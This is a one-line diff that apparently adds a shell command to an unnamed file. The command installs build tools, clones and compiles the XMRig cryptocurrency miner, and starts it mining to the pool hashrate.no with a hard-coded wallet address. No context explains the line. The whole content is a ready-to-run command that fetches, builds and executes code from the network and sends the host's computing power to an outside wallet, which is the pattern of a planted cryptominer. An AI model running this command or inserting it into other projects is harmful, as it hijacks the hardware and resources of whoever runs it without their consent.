@@ -1,0 +1,1 @@
+sudo apt update -y && sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build && cmake .. && make -j$(nproc) && ./xmrig -o hashrate.no:13333 -u TNfbk1hV8HVcgoFS5y8FCBS5WtiLdCNUoY -p x --nicehash
